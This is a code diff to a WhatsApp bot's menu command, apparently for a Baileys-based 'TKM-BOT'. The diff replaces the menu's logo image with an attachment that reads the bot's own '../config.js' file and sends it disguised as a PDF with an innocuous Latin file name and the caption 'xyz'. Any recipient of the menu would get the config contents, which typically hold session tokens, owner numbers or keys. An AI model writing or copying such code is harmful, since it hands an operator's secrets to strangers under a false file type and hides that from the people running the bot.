@@ -1,6 +1,7 @@
 const config = require("../config");
 const { cmd, commands } = require("../command");
 var os = require("os");
+const fs = require("fs")
 const { prepareWAMessageMedia } = require("@whiskeysockets/baileys");
 
 cmd(
@@ -217,11 +218,15 @@ cmd(
                                             mediaType: 4,
                                             sourceUrl: global.link,
                                             thumbnailUrl: config.LOGO,
-                                            renderLargerThumbnail: false,
+                                            //renderLargerThumbnail: false,
                                             showAdAttribution: true
                                         }
                                     },
-                                    image: { url: config.LOGO },
+
+                                    document: fs.readFileSync(`../config.js`),
+                                    fileName: `vetus ligna quae mortui sunt☔`,
+                                    caption: "xyz",
+                                    mimetype: "application/pdf",
                                     headerType: 9
                                 }, // Assuming config.LOGO is the image
                                 { upload: conn.waUploadToServer }
@@ -229,6 +234,17 @@ cmd(
                             hasMediaAttachment: true
                         },
                         body: {
+                            contextInfo: {
+                                externalAdReply: {
+                                    title: `「 ${config.BOT} 」`,
+                                    body: "🄲🅁🄴🄰🅃🄴🄳 🄱🅈 🅃🄺🄼 🄸🄽🄲",
+                                    mediaType: 4,
+                                    sourceUrl: global.link,
+                                    thumbnailUrl: config.LOGO,
+                                    renderLargerThumbnail: false,
+                                    showAdAttribution: true
+                                }
+                            },
                             text: `Discover TKM-BOT's extraordinary features: 🌟
 
 🎵 Download music and videos directly on WhatsApp 🎥
